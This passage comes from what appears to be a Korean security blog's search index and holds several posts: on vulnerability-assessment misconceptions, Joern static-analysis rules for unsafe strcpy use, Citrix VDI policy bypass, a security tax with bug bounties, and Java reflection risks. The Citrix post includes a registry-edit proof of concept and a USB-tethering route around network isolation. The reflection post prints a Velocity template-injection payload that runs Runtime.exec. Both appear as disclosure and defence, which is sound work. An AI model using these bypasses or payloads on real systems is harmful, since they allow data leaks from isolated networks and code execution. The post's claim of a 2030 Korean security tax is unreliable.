됩니다(Ferrante \u0026amp; Canali, 2012)[5].\n결론 보안 취약점 평가는 강력한 사이버 보안 전략의 핵심 요소입니다. 일반적인 오해를 해소하고 체계적이며 통합적인 접근법을 구현함으로써 조직은 보안 수준을 높이고 잠재적인 위협의 위험을 줄일 수 있습니다. 인간 평가자의 한계를 인정하고, 보안 설계 중심의 접근, 체계적인 취약점 관리, 보고 기술 향상을 통해 끊임없이 변화하는 사이버 위협에 효과적으로 대응할 수 있을 것입니다.\n[1] Tyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference.\n[2] Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning.\n[3] OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project.\n[4] Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley.\n[5] Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329.\n","permalink":"https://windshock.github.io/ko/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"\u003ch1 id=\"보안진단-담당자의-흔한-착각\"\u003e보안진단 담당자의 흔한 착각\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Common Misconceptions Toon\" loading=\"lazy\" src=\"/images/post/misconceptions-of-security-assessors.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"비효율적인-취약점-평가-구조와-대응-방법\"\u003e비효율적인 취약점 평가 구조와 대응 방법\u003c/h2\u003e\n\u003ch1 id=\"서론\"\u003e서론\u003c/h1\u003e\n\u003cp\u003e사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.\u003c/p\u003e\n\u003ch1 id=\"보안-취약점-평가에-대한-잘못된-인식\"\u003e보안 취약점 평가에 대한 잘못된 인식\u003c/h1\u003e\n\u003ch2 id=\"1-모든-취약점을-반드시-찾아내야-한다는-믿음\"\u003e1. 모든 취약점을 반드시 찾아내야 한다는 믿음\u003c/h2\u003e\n\u003cp\u003e보안 취약점 평가 담당자들 사이에는 모든 취약점을 반드시 찾아내야 한다는 생각이 팽배합니다. 이는 인간 평가자의 한계를 이해하지 못한 것입니다. Tyma 등(2019)[1]의 연구에 따르면, 광범위한 노력에도 불구하고 일부 취약점만이 발견되었다고 합니다. 또한 회사의 승인 없이 취약점을 분석한 외부인에 대해 배타적인 자세를 보이는 경우도 있습니다. 이러한 인식의 한계는 평가 담당자들에게 좌절감과 불만을 야기할 수 있습니다.\u003c/p\u003e","title":"보안진단 담당자의 흔한 착각"},{"content":"개발문화가 보안수준에 영향을 미칠 수 있을까? 정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가 배경 개방적이고 협업 중심의 개발문화를 가진 구글 등 회사와 달리, 그렇지 못한 일부 조직에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 strcpy 함수를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 정적 분석 도구(joern, codeQL 등)을 커스텀 룰을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\n구글의 개발문화 구글에서는 Google C++ Style Guide를 활용하여 C++ 코드를 작성하고 관리하는데, 이를 회사 조직 차원에서 적용하는 방법은 다음과 같습니다:\n조직 문화: 구글은 개방적이고 협업 중심의 조직 문화를 가지고 있습니다. 이러한 문화는 개발자들이 서로 협력하고, 지식을 공유하며, 서로의 코드를 검토하고 피드백을 주는 환경을 조성합니다2. 이는 코딩 스타일 가이드를 준수하고, 코드의 품질을 높이는 데 도움이 됩니다2. 교육 및 훈련: 구글은 새로운 개발자들에게 코딩 스타일 가이드를 준수하는 방법을 교육하고, 이를 실제 작업에 적용하는 방법을 훈련합니다. 이는 개발자들이 코딩 스타일 가이드를 이해하고, 이를 자신의 작업에 적용하는 데 도움이 됩니다. 도구 및 자원 제공: 구글은 개발자들에게 코딩 스타일 가이드를 준수하는 데 필요한 도구와 자원을 제공합니다1. 예를 들어, cpplint와 같은 lint 툴을 제공하여 코드 스타일 가이드를 준수하는지 자동으로 검사할 수 있습니다. 이러한 방식을 통해 구글은 조직 차원에서 코딩 스타일 가이드를 적용하고, 이를 통해 코드의 일관성을 유지하고, 코드의 품질을 높이는 데 도움이 됩니다. 이 외에도 Google Style Guide에는 다양한 코딩 표준과 규칙이 포함되어 있으며, C++ 표준 위원회 C++ Core Guidelines 자료도 있으니 참고하세요.\n개발문화가 없는 조직 대조적으로 일부 조직에는 강력한 개발 문화가 협업과 코딩 표준 준수를 장려하는 응집력 있는 문화가 부족합니다. 이는 개발을 자주 아웃소싱하고 아웃소싱 파트너가 자주 변경되는 기업의 경우 특히 그렇습니다. 이러한 시나리오에서는 일관되지 않은 관행, 개발자 간의 기술 수준 차이, 응집력 있는 표준 부족으로 인해 보안 수준을 포함한 코드 품질이 저하될 수 있습니다. 결과적으로 이러한 조직은 보안 취약성 및 차선의 코드 품질로 인한 위험이 높아집니다.\nstrcpy 함수의 위험성 strcpy 함수는 문자열을 복사하는 함수입니다. 그러나 이 함수의 주요 문제점은 메모리의 경계를 검사하지 않는다는 것입니다. 즉, 복사될 메모리의 크기보다 원본 문자열의 크기가 더 크면 버퍼 오버플로우 버그가 발생할 수 있습니다. 이는 프로그램 실행 시에 오류를 발생시키거나 프로그램이 오작동할 수 있습니다.\n이러한 문제를 해결하기 위해 C11 표준에서는 strcpy_s 함수를 제공합니다. strcpy_s 함수는 strcpy 함수의 단점을 보완하기 위해 만들어진 함수로, 이 함수를 사용할 때는 복사될 메모리의 크기를 두 번째 인자에 꼭 적어주어야 합니다. 이렇게 하면 버퍼 오버플로우 문제를 방지할 수 있습니다.\n정적 분석 도구 Joern을 사용하면 포괄적인 CPG(코드 속성 그래프)가 구문, 제어 흐름 및 데이터 흐름을 통합 구조로 통합하여 복잡한 보안 취약성과 코드 문제를 철저하게 감지할 수 있으므로 유리합니다. 또한 Joern의 사용자 정의 가능한 쿼리를 통해 특정 프로젝트 요구 사항에 맞는 정밀한 취약성 탐지가 가능하며 확장성 덕분에 대규모 코드베이스를 효율적으로 분석할 수 있습니다. 개발 라이프사이클의 다양한 단계를 자동화하고 통합하는 이 도구의 기능은 문제를 조기에 감지하여 전반적인 코드 품질을 향상시키는 데 도움이 됩니다. 또한 Joern은 여러 프로그래밍 언어를 지원하므로 다양한 개발 환경에 다용도로 사용할 수 있습니다.\n그러나 반드시 Joern을 사용할 필요는 없습니다. CodeQL 및 Checkmarx와 같은 유사한 도구도 강력한 정적 분석 기능을 제공합니다. 자세한 내용은 Joern 문서 및 그래프 데이터베이스 및 코드 분석 기법에 대한 관련 자료를 참조하세요.\n커스텀 룰 예시 구분 Good (보안수준: 양호, 코드품질 : 양호) Normal (보안수준 : 미흡 , 코드품질 : 낮음) Bad (보안수준 : 취약, 코드품질 : 낮음) 설명 입력 값의 유효성 검사는 항상 이루어져야 합니다. 입력 값의 크기를 항상 확인하거나 함수 자체에서 입력의 크기를 검사하는 함수 (strncpy, strlcpy, strcpy_s 등) 들로 대체하여 사용해야합니다. 입력 값의 크기를 확인하여 변수를 생성하고 있으나 위험한 함수를 사용하고 있습니다. 개발자가 데이터 타입에 대한 입력 값 크기를 착각 하는 예외적인 케이스에 취약할 수 있습니다. 입력의 크기를 확인하지 않고 버퍼 복사하는 것 (\u0026lsquo;전통적인 버퍼 오버플로우\u0026rsquo;) 버퍼 오버 플로우 취약점을 통해, 권한 상승, 의도되지 않은 명령 실행 등의 시스템에 심각한 위험을 초래할 수 있습니다. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { size_t MAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const jbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto end; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct zip *za, const char *name) { int len; char *s; \u0026hellip;\u0026hellip; s = NULL; len = strlen(name); if (name[len-1] != \u0026lsquo;/\u0026rsquo;) { if ((s=(char *)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return -1; } strcpy(s, name); \u0026hellip;\u0026hellip; } malloc(정수)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const jbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink : strncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param이 더하기 표현이며, 그 malloc의 data flow 상 선행으로 strlen, 후행으로 strcpy이다. malloc의 param에 정수를 입력하고 data flow 상에서 strcpy를 사용한다. 길이 제한이 없는 알려진 함수(GetStringUTFChars 등)의 결과 값을 strcpy의 input 값으로 사용한다. Rule echo \u0026quot; \\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;) \\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements() \\ .or( \\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)), \\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;)) \\ ).out(\u0026lsquo;REACHES\u0026rsquo;) \\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;)) \\ .id()\u0026quot; 참고 https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"https://windshock.github.io/ko/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"개발문화가-보안수준에-영향을-미칠-수-있을까\"\u003e개발문화가 보안수준에 영향을 미칠 수 있을까?\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Development Culture\" loading=\"lazy\" src=\"/images/post/development-culture.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"정적-분석-도구joern를-이용한-코드-품질과-보안-수준의-평가\"\u003e정적 분석 도구(joern)를 이용한 코드 품질과 보안 수준의 평가\u003c/h2\u003e\n\u003ch1 id=\"배경\"\u003e배경\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b5%ac%ea%b8%80%ec%9d%98-%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94\"\u003e개방적이고 협업 중심의 개발문화를 가진 구글\u003c/a\u003e 등 회사와 달리, \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ea%b0%9c%eb%b0%9c%eb%ac%b8%ed%99%94%ea%b0%80-%ec%97%86%eb%8a%94-%ec%a1%b0%ec%a7%81\"\u003e그렇지 못한 일부 조직\u003c/a\u003e에서는 개인의 역량에 따라 코드의 품질 - 보안 수준을 포함하여 - 이 좌우될 수 있습니다. 특히, C 코드에서 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-%ed%95%a8%ec%88%98%ec%9d%98-%ec%9c%84%ed%97%98%ec%84%b1\"\u003estrcpy 함수\u003c/a\u003e를 사용하는 등의 품질 낮은 코드를 작성하는 경향이 있는 개발자들에게 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%a0%95%ec%a0%81-%eb%b6%84%ec%84%9d-%eb%8f%84%ea%b5%ac\"\u003e정적 분석 도구\u003c/a\u003e(joern, codeQL 등)을 \u003ca href=\"/ko/post/2024-05-22-can-development-culture-influence-security-levels/#%ec%bb%a4%ec%8a%a4%ed%85%80-%eb%a3%b0-%ec%98%88%ec%8b%9c\"\u003e커스텀 룰\u003c/a\u003e을 활용하여 코드의 품질과 보안 수준을 평가하여 제공할 수 있습니다. 결과적으로 개발 문화가 부족한 제한된 상황에서도 코드 품질과 동시에 보안수준이 향상되는, Good한 수준의 코드를 기대할 수 있습니다.\u003c/p\u003e","title":"개발문화가 보안수준에 영향을 미칠 수 있을까?"},{"content":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 주의!! cert.org의 VINCE를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\n관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\n설명 Citrix VDI 에이전트(PicaSvc2.exe)는 Citrix 관리 서버로부터 정책을 수신하고, 이를 레지스트리(HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User)에 기록한 후, 레지스트리에서 읽어 정책을 적용하는 구조로 보입니다. 공격자는 아래의 개념 증명(POC)을 참고하여, 레지스트리 조작을 통해 Citrix 정책 서버가 강제하는 드라이브, 네트워크 접근, 클립보드 작업 등의 보안 정책을 우회할 수 있습니다.\nCitrix의 Common Criteria 인증 문서에 따르면, 이러한 구성 데이터(Configdata)가 공격자에 의해 변경되지 않도록 보호하는 메커니즘이 설계되어 있습니다. 이와 같은 우회는 구현상의 결함으로 간주될 수 있습니다.\n폐쇄되거나 격리된 네트워크 환경에서 VDI를 사용할 경우, Citrix 정책을 우회하여 VDI를 강제로 인터넷에 연결하게 되면 민감한 내부 정보가 외부로 유출될 위험이 있습니다. 특히 대한민국에서는 이러한 행위가 명백한 법 위반으로 간주되며, 네트워크 격리 대책에 대한 재검토가 필요합니다.\n개념 증명 (POC) 공격자는 우선 회사 계정에 접근한 후, 회사의 Citrix VDI(Windows 10 실행 중)에 로그인해야 합니다. VDI 환경은 일반적으로 네트워크 접근, 프린터 사용, 외부 드라이브 연결, 클립보드 접근 등이 제한되어 있습니다.\n공격자는 VDI에 로그인하여 레지스트리를 지속적으로 수정하는 배치 파일(다운로드 링크)을 실행한 후, VDI 세션에서 로그아웃합니다.\n배치 파일을 실행하여 레지스트리를 수정한 후, 공격자는 VDI에서 로그아웃합니다. 재로그인 시, 레지스트리 값이 변조되어 Citrix 정책을 우회할 수 있게 됩니다.\n예시 레지스트리 수정 내용:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] \u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 VDI에 다시 로그인하면, PicaSvc2.exe가 Citrix 서버로부터 정책 설정을 가져와 레지스트리에 저장합니다.\nPicaSvc2.exe가 정책을 쓰고 읽는 동안, 이미 배치 파일에 의해 레지스트리 값이 조작되어 있습니다.\nPicaSvc2.exe는 조작된 정책을 VDI 환경에 적용합니다.\n추가 사항:\n연결 PC의 레지스트리를 수정함으로써 하드웨어 리디렉션이 활성화되어 무단 네트워크 접근이 가능해질 수 있습니다. Citrix의 기본 정책은 USB 클래스 FFh를 허용하므로, iPhone을 테더링 용도로 사용하거나 USB 기반 무선 카드를 통해 네트워크 격리를 우회할 수 있습니다. iPhone 테더링을 활성화하려면, 공격자는 iTunes 설치 프로그램에서 추출한 드라이버인 Apple 네트워크 드라이버와 Apple USB 드라이버를 설치해야 합니다. Citrix 세션에서 iPhone을 리디렉션하면, 네트워크 격리 환경에서도 인터넷 접근이 가능해집니다. 영향 VDI를 사용하여 논리적 네트워크 분리를 유지하는 기업의 경우, 이 취약점을 통해 내부 정보 유출 및 내부 서버에 대한 무단 접근이 발생할 수 있습니다.\n잠재적 영향을 고려할 때, 이러한 공격을 실시간으로 탐지하고 완화하는 것이 매우 중요합니다. 아래는 잠재적인 우회 활동을 발견하고 모니터링하는 단계입니다.\n탐지 이 문제를 탐지하기 위해:\nProcmon을 사용하여 PicaSvc2.exe의 동작을 모니터링합니다. Citrix 에이전트가 정책 설정을 저장하는 레지스트리 키를 조사합니다. 해당 레지스트리 값의 변경 효과를 조작하고 관찰합니다. 설계 분석 Citrix의 Common Criteria 인증 문서에는 구성 데이터의 무단 변경을 방지하기 위한 조치들이 포함되어 있습니다. Citrix의 Common Criteria 인증 정보에 따르면, 가상 데스크탑이나 애플리케이션의 설정과 할당에 필요한 데이터의 기밀성과 무결성이 서버 간 전송 중에도 유지됩니다. 이 설계에는 공격자, 애플리케이션 사용자 또는 데스크탑 사용자가 구성 데이터를 변경하지 못하도록 하는 예방 조치도 포함되어 있습니다.\nCitrix가 위에 언급된 보안 기능들을 구현했음에도 불구하고, 특히 대한민국과 같이 엄격한 네트워크 격리 법규가 적용되는 지역에서는 법적 고려사항도 반드시 검토되어야 합니다.\nCitrix의 보안 목표인 O.Secure_Setup_Data, OE.TLS, OE.Encryption 등은 서버 간 처리 및 전송 중에 구성 데이터의 기밀성과 무결성을 보장합니다.\n자세한 보안 목표와 관리 기능의 역할에 대해서는 다음을 참조하세요:\nFMT_SMF.1/Authorise: 엔드포인트 데이터 접근 제어 정책 관리 FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 법적 고려사항 대한민국에서는 전자금융거래법에 따라 금융감독원이 논리적 네트워크 분리를 선택적으로 구현할 수 있는 조치를 도입하였습니다. 금융 기관은 민감한 데이터가 외부 공격으로부터 보호받도록 네트워크 격리 조치를 채택하여 무단 접근을 차단하고 사고를 예방해야 합니다.\n해당 공격은 관리자 권한이 필요하므로, 기업은 논리적으로 분리된 네트워크 환경에서 PC 사용자에 대한 관리자 권한 제거 정책을 재검토해야 합니다. 또한, 이러한 시스템의 오남용을 방지할 수 있는 규정을 포함하도록 법적 개선이 필요합니다.\n한계 관리자 권한 및 설치 권한이 제한되더라도, 화면 캡처 등의 방법으로 인한 데이터 유출을 완전히 방지하기는 어렵습니다. 논리적 네트워크 격리 모델에 대한 보다 자세한 분석과 해결책은 이 보고서에서 확인할 수 있습니다.\n이러한 한계는 관리자 권한이 제거된 경우에도 조직이 여전히 취약함을 시사하며, 최근 은행 부문에서 유사 사건에 대응하는 사례에서도 보듯이, 기술적 및 규제적 차원에서 이러한 문제들을 해결하는 것이 중요함을 강조합니다.\n관련 이슈 2011년 농협 해킹 사건 이후, 대한민국의 여러 주요 은행은 개인 정보의 유출, 절도 또는 변조를 방지하기 위해 내부-외부 네트워크 분리를 시행하기 시작했습니다. 네트워크 격리는 개인 데이터의 안전을 보장하기 위한 핵심 권고사항으로 남아 있습니다. 관련 지침은 여기에서, ISMS-P 인증 관련 정보는 여기에서 확인할 수 있습니다.\n추가로 Citrix Common Criteria 인증에 관한 정보는 여기와 여기에서 확인할 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"시트릭스-정책-우회는-취약점이-아니라-법률-위반이다\"\u003e시트릭스 정책 우회는 취약점이 아니라 법률 위반이다\u003c/h3\u003e\n\u003ch4 id=\"주의\"\u003e주의!!\u003c/h4\u003e\n\u003cp\u003ecert.org의 \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\u003c/strong\u003e\u003c/p\u003e","title":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다"},{"content":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\n오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\n최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\n일부 국가에서는 이러한 프로그램을 지원하기 위해 보안세를 도입하기도 했습니다. 이 보안세는 사이버 공격 위험이 높은 기업에 부과되며, 그 수익은 정부 NGO와 버그 바운티 프로그램을 설립 및 지원하는 데 사용됩니다. 이 접근 방식은 다소 논란의 여지가 있지만, 사이버 위협에 대비하기 위해 필요한 자금을 마련하는 데 효과적임은 부정할 수 없습니다.\n예를 들어, 보안세를 도입한 국가 중 하나는 대한민국입니다. 2030년에 대한민국 정부는 사이버 공격 위험이 높은 기업에 대해 보안세를 도입하였습니다. 이 세금은 기업의 연간 매출에 따라 0.09%에서 2%까지 부과되며, 기업의 규모와 위험 수준에 따라 차등 적용됩니다. 세금 수익은 국가 사이버 보안 기관 및 다양한 정부 NGO와 버그 바운티 프로그램을 지원하는 데 사용됩니다.\n이와 같은 맥락에서 NGO의 중요성은 매우 큽니다. NGO는 사이버 보안 분야에서 정부와 민간 부문 간의 격차를 메우는 역할을 하며, 기술적 측면의 보안 문제를 보다 효과적으로 처리할 수 있습니다. 이들은 기업 및 조직과 긴밀하게 협력하여 시스템의 취약점과 약점을 식별하고, 정부와의 파트너십을 통해 사이버 위협에 대응하는 데 중요한 역할을 수행합니다.\n정부 NGO와 버그 바운티 프로그램의 역할과 책임(R\u0026amp;R)은 국가와 프로그램에 따라 다를 수 있습니다. 일반적으로 정부 NGO는 사이버 보안 위협에 대한 연구 및 분석을 수행하고, 모범 사례와 가이드라인을 개발하는 역할을 맡습니다. 또한, 기업과 조직에 이러한 모범 사례를 구현할 수 있도록 지침과 지원을 제공하기도 합니다.\n반면, 버그 바운티 프로그램은 개인과 조직이 디지털 시스템의 취약점을 식별하고 신고하도록 유도하기 위해 설계되었습니다. 이 프로그램들은 유효한 취약점을 발견해 신고한 이들에게 현금 등으로 보상함으로써, 사이버 범죄자들이 취약점을 악용하기 전에 이를 찾아내고 해결하는 데 매우 효과적임이 입증되었습니다.\n또한, 이러한 프로그램들은 개인에게 보안세를 부과해서는 안 되며, 보안세 부담은 사이버 공격 위험이 높은 기업과 조직에 있어야 합니다.\n요약하자면, 보안세, NGO, 그리고 버그 바운티 프로그램은 점점 더 복잡해지는 위협 환경 속에서 사이버 보안을 강화하기 위한 중요한 도구들입니다. 정부 기관, NGO, 그리고 민간 기업이 함께 협력함으로써, 취약점을 신속하고 효과적으로 식별 및 해결하여 비용이 많이 들고 파괴적인 사이버 공격의 위험을 줄일 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003e정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\u003c/p\u003e\n\u003cp\u003e오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\u003c/p\u003e\n\u003cp\u003e최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\u003c/p\u003e","title":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화"},{"content":"자바 리플렉션의 보안 위협과 완화 전략 자바 리플렉션 API는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\n리플렉션 API 사용 시의 위험성 리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, execute, eval 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 원격 코드 실행(RCE) 공격을 유발할 수 있습니다.\n예를 들어, 아래 코드는 시스템 명령어를 실행하기 위해 리플렉션을 사용하는 위험성을 보여줍니다:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) 이 코드는 Velocity 템플릿 엔진과 리플렉션을 사용하여 시스템 명령어를 실행하는데, 적절한 보안 조치가 마련되지 않은 경우 공격자에 의해 악용될 수 있습니다. 다행히도, Java 9에서는 이러한 위험을 완화하기 위한 보안 메커니즘이 강화되었습니다.\nJava 9와 StackWalker API Java 9에서는 기존의 Reflection.getCallerClass 메서드가 더 이상 사용되지 않고, 대신 StackWalker API가 도입되었습니다. 이 API는 호출 클래스를 검사하는 보다 안전한 방법을 제공합니다. 이전에는 보안 검사가 바로 직전 호출자에 대해서만 수행되었지만, StackWalker를 사용하면 전체 호출 스택을 검사하여 보다 포괄적인 보안을 확보할 수 있습니다.\n자세한 내용은 Stack Walking API 가이드를 참고하세요. 이 방법은 호출 체인 전체에 걸친 잠재적 취약점을 모두 해결하도록 돕는데, 이는 CVE-2012-4681 취약점 사례에서도 확인할 수 있습니다. 이 취약점에서는 자바의 호출자 민감 메서드가 악용되어 공격이 발생했으나, Java 8 이후로 @CallerSensitive 애노테이션을 통해 이러한 메서드를 보호할 수 있게 되었습니다.\n블랙리스트 기반 보안의 문제점과 화이트리스트의 필요성 전통적인 블랙리스트 기반 보안 접근 방식은 특정 위험 요소를 차단하는 데 초점을 맞추지만, 모든 공격 벡터를 포괄하지 못하는 한계가 있습니다. 예를 들어, 특정 메서드나 클래스를 블랙리스트에 올려도, 공격자는 차단되지 않은 다른 대체 방법을 사용하여 우회할 수 있습니다.\n표현 언어 주입(Expression Language Injection) 및 기타 동적 코드 실행 공격은 이러한 한계를 자주 악용합니다. Blackhat JSON Attacks에서처럼, 블랙리스트 필터링 방식은 우회될 수 있으며, 공격자는 차단되지 않은 경로를 통해 악의적인 명령어를 실행할 수 